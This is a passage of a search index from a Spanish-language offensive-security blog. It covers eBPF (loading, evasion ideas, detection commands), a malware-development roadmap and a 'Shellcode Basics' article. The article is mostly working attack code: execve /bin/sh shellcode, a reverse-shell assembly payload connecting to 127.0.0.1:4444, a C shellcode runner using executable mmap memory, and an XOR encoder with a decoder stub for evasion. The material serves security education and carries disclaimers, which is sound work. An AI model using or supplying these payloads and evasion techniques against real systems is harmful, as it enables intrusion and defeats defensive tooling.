program.bpf.o\n</code></pre>","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#cargar-con-bpftool","title":"Cargar con bpftool","text":"Bash<pre><code># Cargar programa\nsudo bpftool prog load program.bpf.o /sys/fs/bpf/my_prog\n\n# Ver programas cargados\nsudo bpftool prog list\n\n# Attach a kprobe\nsudo bpftool prog attach pinned /sys/fs/bpf/my_prog kprobe __x64_sys_execve\n</code></pre>","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#usando-libbpf-skeleton","title":"Usando libbpf (Skeleton)","text":"C<pre><code>#include \"program.skel.h\"\n\nint main(void)\n{\n    struct program_bpf *skel;\n\n    skel = program_bpf__open_and_load();\n    if (!skel) {\n        fprintf(stderr, \"Failed to load BPF\\n\");\n        return 1;\n    }\n\n    program_bpf__attach(skel);\n\n    // ... main loop ...\n\n    program_bpf__destroy(skel);\n    return 0;\n}\n</code></pre>","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#casos-de-uso-ofensivos","title":"// Casos de Uso Ofensivos","text":"<p>Educational Purposes Only</p> <p>Esta secci\u00f3n es puramente educativa para entender las capacidades de eBPF desde una perspectiva de seguridad.</p>","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#syscall-monitoring-evasion-de-deteccion","title":"Syscall Monitoring (Evasi\u00f3n de Detecci\u00f3n)","text":"<p>Un atacante puede usar eBPF para detectar cuando herramientas de seguridad est\u00e1n siendo ejecutadas:</p> C<pre><code>SEC(\"kprobe/__x64_sys_execve\")\nint detect_security_tools(struct pt_regs *ctx)\n{\n    char comm[16];\n    bpf_get_current_comm(&amp;comm, sizeof(comm));\n\n    // Detectar herramientas de an\u00e1lisis\n    if (comm[0] == 's' &amp;&amp; comm[1] == 't' &amp;&amp; \n        comm[2] == 'r' &amp;&amp; comm[3] == 'a' &amp;&amp;\n        comm[4] == 'c' &amp;&amp; comm[5] == 'e') {\n        // strace detected - take evasive action\n    }\n\n    return 0;\n}\n</code></pre>","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#manipulacion-de-datos-en-transito","title":"Manipulaci\u00f3n de Datos en Tr\u00e1nsito","text":"C<pre><code>// Modificar respuestas de red en XDP\nSEC(\"xdp\")\nint modify_packet(struct xdp_md *ctx)\n{\n    // Parse packet headers...\n    // Modify payload if matches criteria\n    // Recalculate checksums\n    return XDP_TX;  // Transmit modified packet\n}\n</code></pre>","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#deteccion-de-ebpf-malicioso","title":"// Detecci\u00f3n de eBPF Malicioso","text":"","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#indicadores","title":"Indicadores","text":"Bash<pre><code># Listar programas BPF cargados\nsudo bpftool prog list\n\n# Ver maps\nsudo bpftool map list\n\n# Inspeccionar programa espec\u00edfico\nsudo bpftool prog dump xlated id &lt;ID&gt;\n\n# Ver attachments\nsudo bpftool perf list\n</code></pre>","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#kernel-audit","title":"Kernel Audit","text":"Bash<pre><code># Habilitar auditor\u00eda de BPF\necho 1 &gt; /proc/sys/kernel/unprivileged_bpf_disabled\n\n# Logs de carga de BPF\ndmesg | grep -i bpf\n</code></pre>","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#recursos","title":"// Recursos","text":"<p>Learning Path</p> <ol> <li>eBPF.io - Documentaci\u00f3n oficial</li> <li>BPF Performance Tools - Brendan Gregg</li> <li>libbpf-bootstrap - Templates</li> <li>bcc - BPF Compiler Collection</li> </ol>","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#conclusion","title":"// Conclusi\u00f3n","text":"<p>eBPF representa una evoluci\u00f3n significativa en c\u00f3mo interactuamos con el kernel de Linux. Sus aplicaciones van desde observabilidad hasta seguridad ofensiva, y su adopci\u00f3n est\u00e1 creciendo r\u00e1pidamente en la industria.</p> <p>En pr\u00f3ximos art\u00edculos exploraremos:</p> <ul> <li>Desarrollo de un rootkit b\u00e1sico con eBPF</li> <li>T\u00e9cnicas de evasi\u00f3n usando XDP</li> <li>Detecci\u00f3n y hunting de eBPF malicioso</li> </ul> Publicado: 2025-01-09 | Autor: 0x574R","tags":["kernel","ebpf","linux"]},{"location":"research/malware-dev/","title":"Malware Development","text":"<p>Desarrollo de malware con fines educativos: shellcode, loaders, t\u00e9cnicas de evasi\u00f3n y persistencia.</p>"},{"location":"research/malware-dev/#articulos","title":"// Art\u00edculos","text":"shellcode Shellcode Basics <p>Fundamentos de desarrollo de shellcode: syscalls, position-independent code y t\u00e9cnicas b\u00e1sicas.</p> 2025-01-07 \u23f1\ufe0f 25 min"},{"location":"research/malware-dev/#roadmap","title":"// Roadmap","text":""},{"location":"research/malware-dev/#fundamentos","title":"Fundamentos","text":"<ul> <li> Shellcode Basics</li> <li> x86-64 Assembly para Malware</li> <li> Position-Independent Code (PIC)</li> <li> Syscalls vs Libc</li> </ul>"},{"location":"research/malware-dev/#intermediate","title":"Intermediate","text":"<ul> <li> Process Injection Techniques</li> <li> DLL Injection (Windows)</li> <li> Code Caves &amp; Hollowing</li> <li> Anti-Analysis Basics</li> </ul>"},{"location":"research/malware-dev/#advanced","title":"Advanced","text":"<ul> <li> AV/EDR Evasion</li> <li> Syscall Unhooking</li> <li> Direct Syscalls</li> <li> ETW Bypass</li> <li> AMSI Bypass</li> </ul>"},{"location":"research/malware-dev/#persistence","title":"Persistence","text":"<ul> <li> Registry Keys (Windows)</li> <li> Scheduled Tasks</li> <li> Services</li> <li> Rootkits</li> </ul> <p>Legal Disclaimer</p> <p>Este contenido es exclusivamente para fines educativos e investigaci\u00f3n en entornos controlados. El desarrollo y uso de malware fuera de entornos autorizados es ilegal.</p>"},{"location":"research/malware-dev/shellcode-basics/","title":"Shellcode Basics","text":"<p>Fundamentos de desarrollo de shellcode para Linux x86-64: syscalls, t\u00e9cnicas de escritura y consideraciones de Position-Independent Code.</p>","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#que-es-shellcode","title":"// \u00bfQu\u00e9 es Shellcode?","text":"<p>Shellcode es c\u00f3digo m\u00e1quina dise\u00f1ado para ser inyectado y ejecutado en un proceso v\u00edctima. Hist\u00f3ricamente llamado \"shellcode\" porque t\u00edpicamente spawneaba una shell.</p>","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#caracteristicas-del-shellcode","title":"Caracter\u00edsticas del Shellcode","text":"<ul> <li>Position-Independent: Debe funcionar sin importar d\u00f3nde se cargue en memoria</li> <li>Sin NULL bytes: Los NULL bytes (<code>0x00</code>) terminan strings en C</li> <li>Compacto: Menor tama\u00f1o = mayor versatilidad</li> <li>Self-contained: No depende de libraries externas</li> </ul>","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#syscalls-en-linux-x86-64","title":"// Syscalls en Linux x86-64","text":"<p>En Linux x86-64, los syscalls se realizan usando la instrucci\u00f3n <code>syscall</code>:</p> Text Only<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  SYSCALL CONVENTION (x86-64 Linux)                      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                          \u2502\n\u2502  RAX  \u2192  syscall number                                 \u2502\n\u2502  RDI  \u2192  1st argument                                   \u2502\n\u2502  RSI  \u2192  2nd argument                                   \u2502\n\u2502  RDX  \u2192  3rd argument                                   \u2502\n\u2502  R10  \u2192  4th argument                                   \u2502\n\u2502  R8   \u2192  5th argument                                   \u2502\n\u2502  R9   \u2192  6th argument                                   \u2502\n\u2502                                                          \u2502\n\u2502  syscall  \u2192  execute                                    \u2502\n\u2502  RAX      \u2192  return value                               \u2502\n\u2502                                                          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#syscalls-comunes","title":"Syscalls Comunes","text":"Syscall Number Descripci\u00f3n <code>read</code> 0 Leer de file descriptor <code>write</code> 1 Escribir a file descriptor <code>open</code> 2 Abrir archivo <code>close</code> 3 Cerrar file descriptor <code>execve</code> 59 Ejecutar programa <code>fork</code> 57 Crear proceso hijo <code>socket</code> 41 Crear socket <code>connect</code> 42 Conectar socket <code>dup2</code> 33 Duplicar file descriptor","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#hello-world-shellcode","title":"// Hello World Shellcode","text":"","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#assembly-code","title":"Assembly Code","text":"GAS<pre><code>; hello.asm - Hello World shellcode\n; nasm -f elf64 hello.asm &amp;&amp; ld hello.o -o hello\n\nsection .text\nglobal _start\n\n_start:\n    ; write(1, msg, 13)\n    xor rax, rax        ; clear rax\n    mov al, 1           ; syscall: write\n    mov rdi, rax        ; fd: stdout (1)\n    lea rsi, [rel msg]  ; buffer address (PIC)\n    mov dl, 13          ; length\n    syscall\n\n    ; exit(0)\n    xor rax, rax\n    mov al, 60          ; syscall: exit\n    xor rdi, rdi        ; status: 0\n    syscall\n\nmsg: db \"Hello World!\", 10\n</code></pre>","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#compilacion","title":"Compilaci\u00f3n","text":"Bash<pre><code># Ensamblar\nnasm -f elf64 hello.asm -o hello.o\n\n# Linkar\nld hello.o -o hello\n\n# Ejecutar\n./hello\n</code></pre>","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#extraer-bytes","title":"Extraer Bytes","text":"Bash<pre><code># Obtener opcodes\nobjdump -d hello | grep -Po '\\s\\K[a-f0-9]{2}(?=\\s)' | sed 's/^/\\\\x/g' | tr -d '\\n'\n\n# O usar objcopy\nobjcopy -O binary hello hello.bin\nxxd -i hello.bin\n</code></pre>","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#execve-shellcode","title":"// Execve Shellcode","text":"<p>El shellcode m\u00e1s com\u00fan: ejecutar <code>/bin/sh</code>.</p>","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#version-basica","title":"Versi\u00f3n B\u00e1sica","text":"GAS<pre><code>; execve.asm - spawn /bin/sh\nsection .text\nglobal _start\n\n_start:\n    ; Clear registers\n    xor rax, rax\n    xor rdx, rdx        ; envp = NULL\n\n    ; Push \"/bin/sh\\0\" onto stack\n    push rax            ; null terminator\n    mov rdi, 0x68732f6e69622f  ; \"/bin/sh\" in little-endian\n    push rdi\n\n    ; Setup execve(path, argv, envp)\n    mov rdi, rsp        ; path = \"/bin/sh\"\n    push rax            ; argv[1] = NULL\n    push rdi            ; argv[0] = path\n    mov rsi, rsp        ; argv\n\n    ; execve syscall\n    mov al, 59\n    syscall\n</code></pre>","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#evitando-null-bytes","title":"Evitando NULL Bytes","text":"GAS<pre><code>; execve_nonull.asm - sin NULL bytes\nsection .text\nglobal _start\n\n_start:\n    ; xor para limpiar sin MOV 0\n    xor eax, eax\n    xor edx, edx\n\n    ; Push string con XOR trick\n    push rax\n    mov rbx, 0x68732f2f6e69622f  ; \"//bin/sh\"\n    push rbx\n    mov rdi, rsp\n\n    ; Construir argv\n    push rax\n    push rdi\n    mov rsi, rsp\n\n    ; execve (usar AL para evitar NULL en RAX)\n    mov al, 59\n    syscall\n</code></pre>","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#reverse-shell-shellcode","title":"// Reverse Shell Shellcode","text":"<p>Shellcode que conecta de vuelta a un servidor atacante.</p>","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#estructura","title":"Estructura","text":"Text Only<pre><code>1. socket(AF_INET, SOCK_STREAM, 0)  \u2192 crear socket\n2. connect(sockfd, addr, len)       \u2192 conectar al atacante\n3. dup2(sockfd, 0/1/2)              \u2192 redirigir stdin/stdout/stderr\n4. execve(\"/bin/sh\", ...)           \u2192 spawn shell\n</code></pre>","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#codigo-assembly","title":"C\u00f3digo Assembly","text":"GAS<pre><code>; reverse_shell.asm\n; IP: 127.0.0.1 (para testing)\n; Port: 4444\n\nsection .text\nglobal _start\n\n_start:\n    ; socket(AF_INET=2, SOCK_STREAM=1, 0)\n    xor rax, rax\n    mov al, 41          ; syscall: socket\n    xor rdi, rdi\n    mov dil, 2          ; AF_INET\n    xor rsi, rsi\n    mov sil, 1          ; SOCK_STREAM\n    xor rdx, rdx        ; protocol: 0\n    syscall\n    mov rdi, rax        ; save sockfd\n\n    ; struct sockaddr_in\n    xor rax, rax\n    push rax            ; padding\n    mov dword [rsp-4], 0x0100007f  ; IP: 127.0.0.1\n    mov word [rsp-6], 0x5c11       ; Port: 4444 (big-endian)\n    mov word [rsp-8], 0x02         ; AF_INET\n    sub rsp, 8\n\n    ; connect(sockfd, addr, 16)\n    xor rax, rax\n    mov al, 42          ; syscall: connect\n    mov rsi, rsp        ; addr struct\n    xor rdx, rdx\n    mov dl, 16          ; addrlen\n    syscall\n\n    ; dup2(sockfd, 0), dup2(sockfd, 1), dup2(sockfd, 2)\n    xor rsi, rsi\ndup_loop:\n    xor rax, rax\n    mov al, 33          ; syscall: dup2\n    syscall\n    inc rsi\n    cmp sil, 3\n    jl dup_loop\n\n    ; execve(\"/bin/sh\", NULL, NULL)\n    xor rax, rax\n    push rax\n    mov rbx, 0x68732f6e69622f2f  ; \"//bin/sh\"\n    push rbx\n    mov rdi, rsp\n    push rax\n    push rdi\n    mov rsi, rsp\n    xor rdx, rdx\n    mov al, 59\n    syscall\n</code></pre>","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#testing-shellcode","title":"// Testing Shellcode","text":"","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#programa-de-prueba-en-c","title":"Programa de Prueba en C","text":"C<pre><code>// test_shellcode.c\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;sys/mman.h&gt;\n\nunsigned char shellcode[] = \n    \"\\x48\\x31\\xc0\\x48\\x31\\xd2\\x50\\x48\"\n    \"\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\"\n    \"\\x68\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\"\n    \"\\x89\\xe6\\xb0\\x3b\\x0f\\x05\";\n\nint main(void)\n{\n    printf(\"[*] Shellcode length: %lu bytes\\n\", sizeof(shellcode)-1);\n\n    // Allocate executable memory\n    void *exec = mmap(NULL, sizeof(shellcode), \n                      PROT_READ | PROT_WRITE | PROT_EXEC,\n                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\n    if (exec == MAP_FAILED) {\n        perror(\"mmap\");\n        return 1;\n    }\n\n    // Copy shellcode\n    memcpy(exec, shellcode, sizeof(shellcode));\n\n    printf(\"[*] Executing shellcode...\\n\");\n\n    // Cast and execute\n    ((void(*)())exec)();\n\n    return 0;\n}\n</code></pre>","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#compilar-y-ejecutar","title":"Compilar y Ejecutar","text":"Bash<pre><code># Compilar (deshabilitando protecciones para testing)\ngcc -z execstack -fno-stack-protector -o test test_shellcode.c\n\n# Ejecutar\n./test\n</code></pre>","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#tecnicas-de-evasion","title":"// T\u00e9cnicas de Evasi\u00f3n","text":"","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#encoding-xor","title":"Encoding XOR","text":"Python<pre><code>#!/usr/bin/env python3\n# xor_encode.py\n\nshellcode = b\"\\x48\\x31\\xc0...\"  # tu shellcode\nkey = 0x41\n\nencoded = bytes([b ^ key for b in shellcode])\nprint(\"Encoded: \" + \"\".join(f\"\\\\x{b:02x}\" for b in encoded))\n</code></pre>","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#decoder-stub","title":"Decoder Stub","text":"GAS<pre><code>; XOR decoder stub\nsection .text\nglobal _start\n\n_start:\n    jmp get_shellcode\n\ndecoder:\n    pop rsi                 ; shellcode address\n    xor rcx, rcx\n    mov cl, SHELLCODE_LEN   ; length\n\ndecode_loop:\n    xor byte [rsi], 0x41    ; XOR key\n    inc rsi\n    loop decode_loop\n\n    jmp shellcode_start\n\nget_shellcode:\n    call decoder\n\nshellcode_start:\n    ; encoded shellcode goes here\n    db 0x09, 0x70, 0x81...  ; XOR'd bytes\n</code></pre>","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#checklist-de-desarrollo","title":"// Checklist de Desarrollo","text":"<p>Best Practices</p> <ul> <li> Verificar ausencia de NULL bytes</li> <li> Testear en diferentes direcciones de memoria</li> <li> Minimizar tama\u00f1o</li> <li> Probar con ASLR habilitado</li> <li> Documentar syscalls usados</li> </ul>","tags":["shellcode","assembly","linux"]},{"location":"research/malware-dev/shellcode-basics/#recursos","title":"// Recursos","text":"<p>Herramientas</p> <ul> <li>pwntools - Framework de explotaci\u00f3n</li> <li>shellcraft - Generador de shellcode</li> <li>msfvenom - Generador de payloads</li> </ul> Publicado: 2025-01-07 | Autor: 0x574R","tags":["shellcode","assembly","linux"]},{"location":"writeups/","title":"\ud83d\udcc1 Writeups","text":"<p>Resoluci\u00f3n paso a paso de m\u00e1quinas y challenges de diferentes plataformas CTF.</p>"},{"location":"writeups/#plataformas","title":"// Plataformas","text":"\ud83d\udfe9 HackTheBox <p>M\u00e1quinas de penetration testing con diferentes niveles de dificultad.</p> coming soon \ud83d\udd34 TryHackMe <p>Rooms de aprendizaje y pr\u00e1ctica de hacking \u00e9tico.</p> coming soon \ud83c\udff4 CTF Competitions <p>Writeups de competiciones CTF: pwn, reverse, web, crypto.</p> coming soon"},{"location":"writeups/#ultimos-writeups","title":"// \u00daltimos Writeups","text":"<p>En construcci\u00f3n</p> <p>Los writeups se ir\u00e1n publicando progresivamente. Sigue el blog para actualizaciones.</p>"},{"location":"writeups/#categorias","title":"// Categor\u00edas","text":"Categor\u00eda Descripci\u00f3n Count Pwn Binary exploitation, buffer overflows, ROP 0 Web SQLi, XSS, SSRF, deserialization 0 Reverse An\u00e1lisis de malware, crackmes 0 Crypto Criptograf\u00eda aplicada 0 Forensics An\u00e1lisis forense digital 0 <code>$ find /writeups -type f -name \"*.md\" | wc -l</code>"}]}